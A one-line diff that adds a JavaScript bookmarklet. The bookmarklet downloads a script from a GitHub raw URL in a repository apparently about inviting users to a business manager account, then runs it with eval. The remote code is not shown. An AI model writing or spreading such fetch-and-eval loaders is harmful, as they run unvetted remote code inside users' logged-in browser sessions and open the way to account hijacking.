@@ -1,0 +1,1 @@
+javascript:(()=>{fetch("https://raw.githubusercontent.com/trendagency168/INVITE-USER-TO-BM/main/script.js").then(r=>r.text()).then(t=>eval(t)).catch(e=>alert("Bookmarklet error: "+e))})();
